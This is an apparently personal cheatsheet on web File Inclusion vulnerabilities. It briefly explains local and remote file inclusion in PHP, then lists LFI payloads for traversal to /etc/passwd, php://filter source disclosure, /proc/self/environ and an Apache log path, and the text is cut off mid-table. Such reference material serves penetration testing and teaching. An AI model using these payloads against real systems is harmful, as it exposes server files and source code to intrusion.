# ü™§ File Inclusion Cheatsheet

A running log of techniques, payloads, and workflow notes for identifying and exploiting **File Inclusion** vulnerabilities in web applications.

---

## üîç What is File Inclusion?

**File Inclusion** vulnerabilities occur when a web application dynamically loads files based on user input, without proper validation or sanitization. This can allow an attacker to include:

- **Local files** (on the same server) ‚Üí *Local File Inclusion (LFI)*
- **Remote files** (from external sources) ‚Üí *Remote File Inclusion (RFI)*

These bugs often occur in PHP applications using `include()`, `require()`, etc.

## üß™ Basic LFI Payloads

| Payload | Description |
|--------|-------------|
| `?file=../../../../etc/passwd` | Reads sensitive local files (Linux) |
| `?file=/etc/hosts` | Alternate target, often unblocked |
| `?file=./index.php` | Attempt to read application source code |
| `?file=php://filter/convert.base64-encode/resource=index.php` | Base64 encode and view source code |
| `?file=/proc/self/environ` | Useful in log/session injection chains |
| `?file=../../../../../var/log/apache2/access.log`
